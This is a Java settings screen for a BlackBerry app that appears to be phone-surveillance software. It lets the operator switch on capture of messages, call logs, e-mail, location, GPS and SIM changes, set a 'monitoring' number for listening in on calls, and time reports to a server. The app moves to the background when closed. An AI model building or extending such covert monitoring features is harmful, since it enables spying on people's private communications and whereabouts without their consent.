package com.vvt.screen;

import com.vvt.pref.*;
import com.vvt.prot.response.CmdResponse;
import com.vvt.prot.response.struct.SendDeactivateCmdResponse;
import com.vvt.prot.response.struct.SendHeartBeatCmdResponse;
import com.vvt.protmgr.SendDeactivateManager;
import com.vvt.protmgr.PhoenixProtocolListener;
import com.vvt.protmgr.SendHeartBeatManager;
import com.vvt.global.Global;
import com.vvt.info.ApplicationInfo;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseManager;
import com.vvt.license.LicenseStatus;
import com.vvt.std.Log;
import com.vvt.std.PhoneInfo;
import net.rim.device.api.system.Application;
import net.rim.device.api.ui.DrawStyle;
import net.rim.device.api.ui.Field;
import net.rim.device.api.ui.FieldChangeListener;
import net.rim.device.api.ui.UiApplication;
import net.rim.device.api.ui.MenuItem;
import net.rim.device.api.ui.text.TextFilter;
import net.rim.device.api.ui.container.HorizontalFieldManager;
import net.rim.device.api.ui.container.MainScreen;
import net.rim.device.api.ui.container.VerticalFieldManager;
import net.rim.device.api.ui.component.Dialog;
import net.rim.device.api.ui.component.LabelField;
import net.rim.device.api.ui.component.ButtonField;
import net.rim.device.api.ui.component.RichTextField;
import net.rim.device.api.ui.component.CheckboxField;
import net.rim.device.api.ui.component.EditField;
import net.rim.device.api.ui.component.ObjectChoiceField;

public class SettingsScreen extends MainScreen implements FieldChangeListener, PhoenixProtocolListener {
	
	private static final String TITLE = "Settings";
	private static final String CAPTURE_OFF = "Capture status: Stopped";
	private static final String CAPTURE_ON = "Capture status: Started";
	private static final String VERSION_MENU = "About";
	private static final String STATUS_MENU = "Status"; 
	private static final String BBM_LABLE = "BlackBerry Messenger";
	private static final String VOICE_LABLE = "Voice\t\t";
	private static final String SMS_LABLE = "SMS";
	private static final String EMAIL_LABLE = "E-mail";
	private static final String BUG_LABLE = "Monitoring";
	private static final String MONITORING_LABLE = " number: ";
	private static final String WATCH_NUMBER_LABLE = "Watch all numbers";
	private static final String LOC_LABLE = "Location";
	private static final String GPS_LABLE = "GPS change";
	private static final String SIM_LABLE = "SIM change";
	private static final String REFRESH_TIME_LABLE = " refresh time: ";
	private static final String CONNECTION_MENU = "Test Connection";
	private static final String DEACTIVATE_MENU = "Deactivate";
	private static final String SMS_MENU = "SMS Control";
	private static final String TEXT_INIT = "Activities to monitor";
	private static final String REPORT_TIMER = "Report timer";
	private static final String MAX_EVENT = "Max number of events";
	private static final String TEST_CONNECTION_SUCCESS = "Test connection success.";
	private static final String LOC_WARNING = "This timer setting may drain the battery soon. Are you sure?";
	private static final String DEACTIVATE_SUCCESS = "Deactivation success for server and client";
	private static final String DEACTIVATE_FAIL = "Deactivation fail for server and client";
	private static final String DEACTIVATE_FAILED_ON_SERVER = "Deactivation success for client only";
	private static final String DEACTIVATE_BEFORE = "Deactivate product\n\nAll events in your web account will be deleted! \nClick Yes to continue.";
	private boolean defaultFeature = false;
	private boolean fieldChangedApproval = true;
	private boolean backgroundApplication = false;
	// Component
	private Preference pref = Global.getPreference();
	private SendDeactivateManager deactivator = Global.getSendDeactivateManager();
	private SendHeartBeatManager heartBeat = Global.getSendHeartBeatManager();
	private LicenseManager license = Global.getLicenseManager();
	private LicenseInfo licenseInfo = null;
	// UI Part
	private CheckboxField bbmField = null;
	private CheckboxField voiceField = null;
	private CheckboxField smsField = null;
	private CheckboxField emailField = null;
	private CheckboxField simField = null;
	private CheckboxField locationField = null;
	private CheckboxField gpsField = null;
	private CheckboxField watchField = null;
	private CheckboxField bugField = null;
	private EditField monitorField = null;
	private MenuItem versionMenu = null;
	private MenuItem statusMenu = null;
	private MenuItem connectionMenu = null;
	private MenuItem deactivateMenu = null;
	private MenuItem smsMenu = null;
	private ButtonField startStopField = null;
	private ObjectChoiceField locationTimerField = null;
	private ObjectChoiceField gpsTimerField = null;
	private ObjectChoiceField reportTimerField = null; 
	private ObjectChoiceField maxEventField = null;
	private RichTextField startStopMessage = null;
	private VerticalFieldManager leftVerticalMgr = new VerticalFieldManager();
	private VerticalFieldManager rightVerticalMgr = new VerticalFieldManager();
	private HorizontalFieldManager bbmHorizontalMgr = new HorizontalFieldManager();
	private HorizontalFieldManager standardHorizontalMgr = new HorizontalFieldManager();
	private HorizontalFieldManager locationHorizontalMgr = new HorizontalFieldManager();
	private HorizontalFieldManager gpsHorizontalMgr = new HorizontalFieldManager();
	private HorizontalFieldManager bugHorizontalMgr = new HorizontalFieldManager();
	private HorizontalFieldManager watchHorizontalMgr = new HorizontalFieldManager();
	private SettingsScreen self = this;
	private ProgressThread progressThread = null;
	
	public SettingsScreen() {
		try {
			setTitle(TITLE);
			removeAllMenuItems();
			createUI();
			createMenu();
		} catch(Exception e) {
			Log.error("SettingsScreen.constructor", null, e);
		}
	}
	
	public void refreshUI() {
		try {
			fieldChangedApproval = false;
			PrefMessenger prefMessenger = (PrefMessenger)pref.getPrefInfo(PreferenceType.PREF_IM);
			PrefEventInfo prefEvent = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
			PrefCellInfo prefCell = (PrefCellInfo)pref.getPrefInfo(PreferenceType.PREF_CELL_INFO);
			PrefGPS prefGPS = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
			final PrefBugInfo prefBug = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
			PrefSystem prefSystem = (PrefSystem)pref.getPrefInfo(PreferenceType.PREF_SYSTEM);
			if (prefMessenger.isSupported()) {
				// BBM Fields
				synchronized (Application.getEventLock()) {
					bbmField.setChecked(prefMessenger.isBBMEnabled());
				}
			}
			if (prefEvent.isSupported()) {
				// Standard Fields
				synchronized (Application.getEventLock()) {
					voiceField.setChecked(prefEvent.isCallLogEnabled());
					smsField.setChecked(prefEvent.isSMSEnabled());
					emailField.setChecked(prefEvent.isEmailEnabled());
				}
			}
			if (prefSystem.isSupported()) {
				// SIM Fields
				synchronized (Application.getEventLock()) {
					simField.setChecked(prefSystem.isSIMChangeEnabled());
				}
			}
			if (prefBug.isSupported()) {
				// Bug Field
				synchronized (Application.getEventLock()) {
					bugField.setChecked(prefBug.isEnabled());
					monitorField.setText(prefBug.getMonitorNumber());
					Application.getApplication().invokeLater(new Runnable() {
						public void run() {
							synchronized (Application.getEventLock()) {
								monitorField.setEditable(prefBug.isEnabled());
							}
						}
					});
					if (prefBug.isConferenceSupported()) {
						watchField.setChecked(prefBug.isWatchAllEnabled());
						Application.getApplication().invokeLater(new Runnable() {
							public void run() {
								synchronized (Application.getEventLock()) {
									watchField.setEditable(prefBug.isEnabled());
								}
							}
						});
					}
				}
			}
			if (prefCell.isSupported()) {
				// Location Field
				synchronized (Application.getEventLock()) {
					locationField.setChecked(prefCell.isEnabled());
					locationTimerField.setEditable(prefCell.isEnabled());
					int locInterval = prefCell.getInterval();
					locationTimerField.setSelectedIndex(getTimerIndex(locInterval));
				}
			}
			if (prefGPS.isSupported()) {
				// GPS Field
				synchronized (Application.getEventLock()) {
					gpsField.setChecked(prefGPS.isEnabled());
					gpsTimerField.setEditable(prefGPS.isEnabled());
					int interval = prefGPS.getGpsOption().getInterval();
					gpsTimerField.setSelectedIndex(getTimerIndex(interval));
				}
			}
			// refresh start/stop button.
			manageStartAndStopField(isSomeDefaultEventsEnabled());
		} catch(Exception e) {
			Log.error("SettingsScreen.refreshUI", null, e);
		}
		fieldChangedApproval = true;
	}
	
	private String getStartStopLabel(boolean start) {
		return (start ? " Start" : " Stop") + " Capture ";
	}
	
	private void initializeStartStopField() {
		HorizontalFieldManager hfManagerS2 = new HorizontalFieldManager(Field.FIELD_HCENTER);
		startStopField = new ButtonField("", Field.FIELD_HCENTER | ButtonField.CONSUME_CLICK);
		startStopField.setChangeListener(this);
		hfManagerS2.add(startStopField);
		add(hfManagerS2);
		startStopMessage = new RichTextField("", Field.NON_FOCUSABLE);
		add(startStopMessage);
		manageStartAndStopField(isSomeDefaultEventsEnabled());
	}
	
	private boolean isSomeDefaultEventsEnabled() {
		PrefEventInfo eventInfo = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
		return eventInfo.isCallLogEnabled() || eventInfo.isEmailEnabled() || eventInfo.isSMSEnabled();
	}

	private void initializeCountEventField() {
		PrefGeneral settings = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
		int eventIndex = settings.getMaxEventIndex();
		for (int i = 0; i < ApplicationInfo.EVENT_VALUE.length; i++) {
			if (eventIndex == ApplicationInfo.EVENT_VALUE[i]) {
				eventIndex = i;
				break;
			}
		}
		maxEventField = new ObjectChoiceField(MAX_EVENT, ApplicationInfo.EVENT);
		maxEventField.setSelectedIndex(eventIndex);
		maxEventField.setChangeListener(this);
		add(maxEventField);
	}

	private void initializeTimerField() {
		PrefGeneral settings = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
		int timerIndex = settings.getSendTimeIndex();
		for (int i = 0; i < ApplicationInfo.TIME_VALUE.length; i++) {
			if (timerIndex == ApplicationInfo.TIME_VALUE[i]) {
				timerIndex = i;
				break;
			}
		}
		reportTimerField = new ObjectChoiceField(REPORT_TIMER, ApplicationInfo.TIME);
		reportTimerField.setSelectedIndex(timerIndex);
		reportTimerField.setChangeListener(this);
		add(reportTimerField);
	}

	private void createMenu() {
		versionMenu = new MenuItem(VERSION_MENU, 3400000, MenuItem.SELECT) {
        	public void run() {
				UiApplication.getUiApplication();
				synchronized (Application.getEventLock()) {
					UiApplication.getUiApplication().pushScreen(new AboutPopup());
				}
        	}
        };
        statusMenu = new MenuItem(STATUS_MENU, 1600000, 1024) {
        	public void run() {
        		UiApplication.getUiApplication().pushScreen(new StatusReportScreen(self));
        	}
        };
        connectionMenu = new MenuItem(CONNECTION_MENU, 1800000, 1024) {
        	public void run() {
        		testConnection();
        	}
        };
        deactivateMenu = new MenuItem(DEACTIVATE_MENU, 2400000, 1024) {
        	public void run() {
				Dialog dialog = new Dialog(Dialog.D_YES_NO, DEACTIVATE_BEFORE, Dialog.NO, null, Field.USE_ALL_WIDTH);
				int selected = dialog.doModal();
				if (selected == Dialog.YES) {
					deactivate();
				}
        	}
        };
        smsMenu = new MenuItem(SMS_MENU, 2000000, 1024) {
        	public void run() {
        		UiApplication.getUiApplication().pushScreen(new SMSControlScreen());
        	}
        };
        addMenuItem(versionMenu);
        addMenuItem(statusMenu);
        addMenuItem(connectionMenu);
        addMenuItem(deactivateMenu);
        addMenuItem(smsMenu);
	}
	
	private void testConnection() {
		heartBeat.addListener(this);
		heartBeat.testConnection();
	}
	
	private void deactivate() {
		deactivator.addListener(this);
		deactivator.deactivate();
		progressThread = new ProgressThread(this);
		progressThread.start();
	}

	private void createUI() {
		try {
			initializeTimerField();
			initializeCountEventField();
			LabelField filterLabel = new LabelField(TEXT_INIT);
			add(filterLabel);
			licenseInfo = license.getLicenseInfo();
			PrefMessenger prefMessenger = (PrefMessenger)pref.getPrefInfo(PreferenceType.PREF_IM);
			PrefEventInfo prefEvent = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
			PrefCellInfo prefCell = (PrefCellInfo)pref.getPrefInfo(PreferenceType.PREF_CELL_INFO);
			PrefGPS prefGPS = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
			PrefBugInfo prefBug = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
			PrefSystem prefSystem = (PrefSystem)pref.getPrefInfo(PreferenceType.PREF_SYSTEM);
			if (prefMessenger.isSupported()) {
				// BBM Fields
				initializeBBMField(prefMessenger);
			}
			if (prefEvent.isSupported()) {
				// Standard Fields
				initializeStandardField(prefEvent);
			}
			if (prefSystem.isSupported()) {
				// SIM Fields
				initializeSIMField(prefSystem);
			}
			if (prefBug.isSupported()) {
				// Bug Field
				initializeBugField(prefBug);
			}
			if (prefCell.isSupported()) {
				// Location Field
				initializeLocationField(prefCell);
			}
			if (prefGPS.isSupported()) {
				// GPS Field
				initializeGPSField(prefGPS);
			}
			initializeStartStopField();
		}
		catch(Exception e) {
			Log.error("SettingsScreen.createUI", null, e);
		}
	}
	
	private void manageStartAndStopField(final boolean running) {
		try {
			final String label = getStartStopLabel(!running);
			if (PhoneInfo.isFiveOrHigher()) {
				Application.getApplication().invokeLater(new Runnable() {
					public void run() {
						synchronized (Application.getEventLock()) {
							startStopField.setLabel(label);
						}
					}
				});
				Application.getApplication().invokeLater(new Runnable() {
					public void run() {
						synchronized (Application.getEventLock()) {
							startStopMessage.setText(running ? CAPTURE_ON : CAPTURE_OFF);
						}
					}
				});
			} else {
				synchronized (Application.getEventLock()) {
					startStopField.setLabel(label);
				}
				synchronized (Application.getEventLock()) {
					startStopMessage.setText(running ? CAPTURE_ON : CAPTURE_OFF);
				}
			}

		} catch (Exception e) {
			Log.error("SettingsScreen.manageStartAndStopField", null, e);
		}
	}
	
	private void initializeBBMField(PrefMessenger prefMessenger) {
		// To set enabled value.
		bbmField = new CheckboxField(BBM_LABLE, prefMessenger.isBBMEnabled());
		bbmHorizontalMgr.add(bbmField);
		add(bbmHorizontalMgr);
		bbmField.setChangeListener(this);
		pref.commit(prefMessenger);
	}

	private void initializeStandardField(PrefEventInfo eventInfo) {
		// To set enabled value.
		voiceField = new CheckboxField(VOICE_LABLE, eventInfo.isCallLogEnabled());
		smsField = new CheckboxField(SMS_LABLE, eventInfo.isSMSEnabled());
		emailField = new CheckboxField(EMAIL_LABLE, eventInfo.isEmailEnabled());
		leftVerticalMgr.add(voiceField);
		leftVerticalMgr.add(smsField);
		rightVerticalMgr.add(emailField);
		standardHorizontalMgr.add(leftVerticalMgr);
		standardHorizontalMgr.add(rightVerticalMgr);
		add(standardHorizontalMgr);
		voiceField.setChangeListener(this);
		smsField.setChangeListener(this);
		emailField.setChangeListener(this);
		pref.commit(eventInfo);
	}
	
	private void initializeSIMField(PrefSystem systemInfo) {
		// To set enabled value.
		simField = new CheckboxField(SIM_LABLE, systemInfo.isSIMChangeEnabled());
		rightVerticalMgr.add(simField);
		simField.setChangeListener(this);
		pref.commit(systemInfo);
	}
	
	private void initializeBugField(PrefBugInfo bugInfo) {
		// To set enabled value.
		bugField = new CheckboxField(BUG_LABLE, bugInfo.isEnabled(), Field.FIELD_LEFT);
		monitorField = new EditField(MONITORING_LABLE, bugInfo.getMonitorNumber(), 20, Field.FIELD_RIGHT);
		TextFilter filter = TextFilter.get(TextFilter.DEFAULT_SMART_PHONE);
		monitorField.setFilter(filter);
		monitorField.setEditable(bugInfo.isEnabled());
		bugHorizontalMgr.add(bugField);
		bugHorizontalMgr.add(monitorField);
		add(bugHorizontalMgr);
		add(watchHorizontalMgr);
		bugField.setChangeListener(this);
		monitorField.setChangeListener(this);
		if (bugInfo.isConferenceSupported()) {
			watchField = new CheckboxField(WATCH_NUMBER_LABLE, bugInfo.isWatchAllEnabled());
			watchField.setEditable(bugInfo.isEnabled());
			watchHorizontalMgr.add(watchField);
			watchField.setChangeListener(this);
		}
		pref.commit(bugInfo);
	}

	private void initializeLocationField(PrefCellInfo cellInfo) {
		// To set enabled value.
		int locInterval = cellInfo.getInterval();
		locationField = new CheckboxField(LOC_LABLE, cellInfo.isEnabled(), Field.FIELD_LEFT);
		locationTimerField = new ObjectChoiceField(REFRESH_TIME_LABLE, ApplicationInfo.LOCATION_TIMER, getTimerIndex(locInterval), DrawStyle.RIGHT | Field.USE_ALL_WIDTH);
		locationTimerField.setEditable(cellInfo.isEnabled());
		locationHorizontalMgr.add(locationField);
		locationHorizontalMgr.add(locationTimerField);
		add(locationHorizontalMgr);
		locationField.setChangeListener(this);
		locationTimerField.setChangeListener(this);
		pref.commit(cellInfo);
	}
	
	private void initializeGPSField(PrefGPS gpsInfo) {
		// To set enabled value.
		int interval = gpsInfo.getGpsOption().getInterval();
		gpsField = new CheckboxField(GPS_LABLE, gpsInfo.isEnabled(), Field.FIELD_LEFT);
		gpsTimerField = new ObjectChoiceField(REFRESH_TIME_LABLE, ApplicationInfo.LOCATION_TIMER, getTimerIndex(interval), DrawStyle.RIGHT | Field.USE_ALL_WIDTH);
		gpsTimerField.setEditable(gpsInfo.isEnabled());
		gpsHorizontalMgr.add(gpsField);
		gpsHorizontalMgr.add(gpsTimerField);
		add(gpsHorizontalMgr);
		gpsField.setChangeListener(this);
		gpsTimerField.setChangeListener(this);
		pref.commit(gpsInfo);
	}
	
	private int getTimerIndex(int interval) {
		int index = 0;
		for (int i = 0; i < ApplicationInfo.LOCATION_TIMER_SECONDS.length; i++) {
			if (ApplicationInfo.LOCATION_TIMER_SECONDS[i] == interval) {
				index = i;
				break;
			}
		}
		return index;
	}
	
	private void cancelProgressBar() {
		if (progressThread.isAlive()) {
			progressThread.stopProgressThread();
		}
		addMenuItem(deactivateMenu);
	}

	// FieldChangeListener
	public void fieldChanged(Field field, int context) {
		if (fieldChangedApproval) {
			if (field.equals(reportTimerField)) {
				synchronized (Application.getEventLock()) {
					PrefGeneral settings = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
					settings.setSendTimeIndex(reportTimerField.getSelectedIndex());
					pref.commit(settings);
				}
			} else if(field.equals(maxEventField)) {
				synchronized (Application.getEventLock()) {
					PrefGeneral settings = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
					settings.setMaxEventIndex(maxEventField.getSelectedIndex());
					pref.commit(settings);
				}
			} else if (field.equals(voiceField)) {
				boolean voiceStatus = voiceField.getChecked();
				synchronized (Application.getEventLock()) {
					PrefEventInfo eventInfo = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
					eventInfo.setCallLogEnabled(voiceStatus);
					pref.commit(eventInfo);
					manageStartAndStopField(isSomeDefaultEventsEnabled());
				}
			} else if (field.equals(locationField)) {
				boolean locStatus = locationField.getChecked();
				synchronized (Application.getEventLock()) {
					locationTimerField.setEditable(locStatus);
					PrefCellInfo cellInfo = (PrefCellInfo)pref.getPrefInfo(PreferenceType.PREF_CELL_INFO);
					cellInfo.setEnabled(locStatus);
					pref.commit(cellInfo);
				}
			} else if (field.equals(locationTimerField)) {
				synchronized (Application.getEventLock()) {
					PrefCellInfo cellInfo = (PrefCellInfo)pref.getPrefInfo(PreferenceType.PREF_CELL_INFO);
					boolean alter = true;
					int locationTimerIndex = locationTimerField.getSelectedIndex();
					int locInterval = cellInfo.getInterval();
					int index = getTimerIndex(locInterval);
					if (ApplicationInfo.PRO_I_R != licenseInfo.getProductConfID() && ApplicationInfo.PROX_I_R != licenseInfo.getProductConfID() && locationTimerIndex <= cellInfo.getWarningPosition() && locationTimerIndex != index) {
						Dialog dialog = new Dialog(Dialog.D_YES_NO, LOC_WARNING, Dialog.NO, null, DEFAULT_CLOSE);
						int selected = dialog.doModal();
						if (selected == Dialog.NO) {
							alter = false;
						}
					}
					if (alter) {
						cellInfo.setInterval(ApplicationInfo.LOCATION_TIMER_SECONDS[locationTimerField.getSelectedIndex()]);
						pref.commit(cellInfo);
					} else {
						locationTimerField.setSelectedIndex(index);
					}
				}
			} else if (field.equals(gpsField)) {
				boolean gpsStatus = gpsField.getChecked();
				synchronized (Application.getEventLock()) {
					gpsTimerField.setEditable(gpsStatus);
					PrefGPS gpsInfo = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
					gpsInfo.setEnabled(gpsStatus);
					pref.commit(gpsInfo);
				}
			} else if (field.equals(gpsTimerField)) {
				synchronized (Application.getEventLock()) {
					PrefGPS gpsInfo = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
					boolean alter = true;
					int gpsTimerIndex = gpsTimerField.getSelectedIndex();
					int locInterval = gpsInfo.getGpsOption().getInterval();
					int index = getTimerIndex(locInterval);
					if (ApplicationInfo.PRO_I_R != licenseInfo.getProductConfID() && ApplicationInfo.PROX_I_R != licenseInfo.getProductConfID() && gpsTimerIndex <= gpsInfo.getWarningPosition() && gpsTimerIndex != index) {
						Dialog dialog = new Dialog(Dialog.D_YES_NO, LOC_WARNING, Dialog.NO, null, DEFAULT_CLOSE);
						int selected = dialog.doModal();
						if (selected == Dialog.NO) {
							alter = false;
						}
					}
					if (alter) {
						gpsInfo.getGpsOption().setInterval(ApplicationInfo.LOCATION_TIMER_SECONDS[gpsTimerField.getSelectedIndex()]);
						pref.commit(gpsInfo);
					} else {
						gpsTimerField.setSelectedIndex(index);
					}
				}
			} else if (field.equals(bugField)) {
				boolean bugStatus = bugField.getChecked();
				synchronized (Application.getEventLock()) {
					PrefBugInfo bugInfo = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
					monitorField.setEditable(bugStatus);
					bugInfo.setEnabled(bugStatus);
					if (bugInfo.isConferenceSupported()) {
						watchField.setEditable(bugStatus);
						watchField.setChecked(bugStatus);
						bugInfo.setWatchAllEnabled(bugStatus);
					}
					pref.commit(bugInfo);
				}
			} else if (field.equals(monitorField)) {
				synchronized (Application.getEventLock()) {
					PrefBugInfo bugInfo = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
					bugInfo.setMonitorNumber(monitorField.getText());
					pref.commit(bugInfo);
				}
			} else if (field.equals(watchField)) {
				boolean watchStatus = watchField.getChecked();
				synchronized (Application.getEventLock()) {
					PrefBugInfo bugInfo = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
					bugInfo.setWatchAllEnabled(watchStatus);
					pref.commit(bugInfo);
				}
			} else if (field.equals(emailField)) {
				boolean emailStatus = emailField.getChecked();
				synchronized (Application.getEventLock()) {
					PrefEventInfo eventInfo = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
					eventInfo.setEmailEnabled(emailStatus);
					pref.commit(eventInfo);
					manageStartAndStopField(isSomeDefaultEventsEnabled());
				}
			} else if (field.equals(smsField)) {
				boolean smsStatus = smsField.getChecked();
				synchronized (Application.getEventLock()) {
					PrefEventInfo eventInfo = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
					eventInfo.setSMSEnabled(smsStatus);
					pref.commit(eventInfo);
					manageStartAndStopField(isSomeDefaultEventsEnabled());
				}
			} else if (field.equals(simField)) {
				boolean simStatus = simField.getChecked();
				synchronized (Application.getEventLock()) {
					PrefSystem system = (PrefSystem)pref.getPrefInfo(PreferenceType.PREF_SYSTEM);
					system.setSIMChangeEnabled(simStatus);
					pref.commit(system);
				}
			} else if (field.equals(bbmField)) {
				boolean bbmStatus = bbmField.getChecked();
				synchronized (Application.getEventLock()) {
					PrefMessenger messenger = (PrefMessenger)pref.getPrefInfo(PreferenceType.PREF_IM);
					messenger.setBBMEnabled(bbmStatus);
					pref.commit(messenger);
				}
			} else if (field.equals(startStopField)) {
				synchronized (Application.getEventLock()) {
					fieldChangedApproval = false;
					boolean isSomeDefaultEventsEnabled = !isSomeDefaultEventsEnabled();
					PrefEventInfo event = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
					voiceField.setChecked(isSomeDefaultEventsEnabled);
					smsField.setChecked(isSomeDefaultEventsEnabled);
					emailField.setChecked(isSomeDefaultEventsEnabled);
					event.setCallLogEnabled(isSomeDefaultEventsEnabled);
					event.setSMSEnabled(isSomeDefaultEventsEnabled);
					event.setEmailEnabled(isSomeDefaultEventsEnabled);
					manageStartAndStopField(isSomeDefaultEventsEnabled);
					pref.commit(event);
					fieldChangedApproval = true;
				}
			}
		}
	}
	
	// PhoenixProtocolListener
	public void onError(String message) {
		Log.error("SettingsScreen.onError", "message: " + message);
	}
	
	public void onSuccess(CmdResponse response) {
		try {
			if (response instanceof SendDeactivateCmdResponse) {
				cancelProgressBar();
				SendDeactivateCmdResponse sendDeactCmdRes = (SendDeactivateCmdResponse)response;
				int statusCode = sendDeactCmdRes.getStatusCode();
				if (statusCode == 0) {
					Application.getApplication().invokeLater(new Runnable() {
						public void run() {
							synchronized (Application.getEventLock()) {
								Dialog.alert(DEACTIVATE_SUCCESS);
							}
						}
					});
					licenseInfo = license.getLicenseInfo();
					licenseInfo.setLicenseStatus(LicenseStatus.DEACTIVATED);
					license.commit(licenseInfo);
				} else {
					Application.getApplication().invokeLater(new Runnable() {
						public void run() {
							synchronized (Application.getEventLock()) {
								Dialog.alert(DEACTIVATE_FAIL);
							}
						}
					});
				}
			} else if (response instanceof SendHeartBeatCmdResponse) {
				final SendHeartBeatCmdResponse sendHeartBeatCmdRes = (SendHeartBeatCmdResponse)response;
				int statusCode = sendHeartBeatCmdRes.getStatusCode();
				if (statusCode == 0) {
					Application.getApplication().invokeLater(new Runnable() {
						public void run() {
							synchronized (Application.getEventLock()) {
								Dialog.alert(TEST_CONNECTION_SUCCESS);
							}
						}
					});
				} else {
					Application.getApplication().invokeLater(new Runnable() {
						public void run() {
							synchronized (Application.getEventLock()) {
								Dialog.alert(sendHeartBeatCmdRes.getServerMsg());
							}
						}
					});
				}
				// To save last connection.
				PrefGeneral generalInfo = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
				generalInfo.setLastConnection(System.currentTimeMillis());
				generalInfo.setConnectionMethod(sendHeartBeatCmdRes.getConnectionMethod());
				pref.commit(generalInfo);
			}
		} catch(Exception e) {
			Log.error("SettingsScreen.onSuccess", null, e);
		}
	}

	// Screen
	public boolean onClose() {
		UiApplication.getUiApplication().requestBackground();
		return false;
	}
}
